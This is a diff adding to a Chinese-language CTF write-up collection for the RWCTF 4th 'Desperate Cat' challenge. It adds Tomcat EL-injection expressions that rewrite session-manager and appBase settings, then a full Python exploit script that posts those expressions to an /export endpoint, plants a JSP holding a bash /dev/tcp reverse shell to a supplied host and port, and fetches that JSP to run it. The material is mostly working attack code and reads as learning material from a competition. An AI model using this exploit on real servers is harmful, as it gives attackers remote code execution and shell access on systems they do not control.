@@ -571,7 +571,59 @@ module.exports = router
 
 出题人文章：[RWCTF 4th Desperate Cat Writeup - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/461743167)
 
+el表达式解析
+```java
+${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
+//设置
+${sessionScope[param.b]=param.c}
+${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}
+```
+
+这里直接贴exp
 exp.py
 ```python
+#!/usr/bin/env python3
 
+import sys
+import time
+import requests
+
+PROXIES = None
+
+if __name__ == '__main__':
+    target_url = sys.argv[1]    # e.g. http://47.243.235.228:39465/
+    reverse_shell_host = sys.argv[2]
+    reverse_shell_port = sys.argv[3]
+    el_payload = r"""${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
+${sessionScope[param.b]=param.c}
+${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""
+    reverse_shell_jsp_payload = r"""<%Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sh -i >& /dev/tcp/""" + reverse_shell_host + "/" + reverse_shell_port + r""" 0>&1"});%>"""
+    r = requests.post(url=f'{target_url}/export',
+    data={
+    'dir': '',
+    'filename': 'a.jsp',
+    'content': el_payload,
+    },
+    proxies=PROXIES)
+    shell_path = r.text.strip().split('/')[-1]
+    shell_url = f'{target_url}/export/{shell_path}'
+    r2 = requests.post(url=shell_url,
+    data={
+        'a': '/tmp/session.jsp',
+        'b': 'voidfyoo',
+        'c': reverse_shell_jsp_payload,
+        'd': '/',
+    },
+    proxies=PROXIES)
+    r3 = requests.post(url=f'{target_url}/export',
+    data={
+        'dir': './WEB-INF/lib/',
+        'filename': 'a.jar',
+        'content': 'a',
+    },
+    proxies=PROXIES)
+    time.sleep(10)  # wait a while
+    r4 = requests.get(url=f'{target_url}/tmp/session.jsp', proxies=PROXIES)
 ```
